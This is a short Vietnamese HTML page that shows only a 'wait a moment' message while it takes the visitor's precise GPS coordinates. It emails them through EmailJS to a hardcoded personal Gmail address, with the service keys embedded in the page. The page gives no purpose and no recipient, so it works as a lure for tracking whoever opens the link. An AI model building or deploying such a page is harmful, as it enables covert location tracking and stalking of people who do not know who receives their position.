<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chờ lát nhé</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        (function() {
            emailjs.init("4OQAqbNTwSeMbQUcX");
        })();
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: #f0f0f0;
        }
        h2 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        #status {
            font-size: 18px;
            color: #333;
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            max-width: 90%;
            word-wrap: break-word;
        }
        .loading { color: blue; font-weight: bold; }
        .success { color: green; background-color: #e0ffe0; }
        .error { color: red; background-color: #ffe0e0; }
        @media (max-width: 600px) {
            h2 { font-size: 20px; }
            #status { font-size: 16px; }
        }
    </style>
</head>
<body>
    <h2>Chờ một lát nhé</h2>
    <div id="status" class="loading">Đang lấy vị trí...</div>
    <script>
        const statusDiv = document.getElementById("status");

        function updateStatus(message, type = "") {
            statusDiv.innerText = message;
            statusDiv.className = type;
        }

        // Timeout thủ công để tránh treo loading
        const timeoutId = setTimeout(() => {
            updateStatus("Hết thời gian chờ. Vui lòng kiểm tra GPS hoặc kết nối mạng và thử lại.", "error");
        }, 20000);

        navigator.geolocation.getCurrentPosition(
            (position) => {
                clearTimeout(timeoutId); // Hủy timeout thủ công
                const { latitude, longitude } = position.coords;
                updateStatus(`Vị trí: ${latitude}, ${longitude}\nĐang gửi...`, "loading");
                console.log("Vị trí:", latitude, longitude);

                if (!latitude || !longitude) {
                    updateStatus("Lỗi: Tọa độ không hợp lệ.", "error");
                    return;
                }

                const emailData = {
                    lat: latitude.toString(),
                    lon: longitude.toString(),
                    to_email: "thanhkhazyd598@gmail.com"
                };
                console.log("Dữ liệu gửi đi:", emailData);

                emailjs.send(
                    "service_i4tl7m4",
                    "template_2v52xwf",
                    emailData
                )
                .then(() => {
                    console.log("Email đã gửi thành công!");
                    updateStatus(`Vị trí: ${latitude}, ${longitude}\nEmail đã gửi! Cảm ơn bạn!`, "success");
                })
                .catch((error) => {
                    console.error("Lỗi gửi email:", error);
                    updateStatus(`Lỗi gửi email: ${error.text || error}\nVui lòng thử lại sau.`, "error");
                });
            },
            (error) => {
                clearTimeout(timeoutId); // Hủy timeout thủ công
                console.error("Không có quyền:", error.code, error.message);
                let message = "";
                switch (error.code) {
                    case 1: message = "Bạn đã từ chối cấp quyền. Hãy bật quyền truy cập vị trí trong cài đặt trình duyệt."; break;
                    case 2: message = "Không thể xác định vị trí. Vui lòng kiểm tra GPS hoặc kết nối mạng."; break;
                    case 3: message = "Hết thời gian chờ. Vui lòng thử lại."; break;
                    default: message = "Lỗi không xác định. Vui lòng thử lại sau.";
                }
                updateStatus(`${message}\nNhấn F5 để thử lại.`, "error");
            },
            { timeout: 15000, maximumAge: 0, enableHighAccuracy: true }
        );
    </script>
</body>
</html>
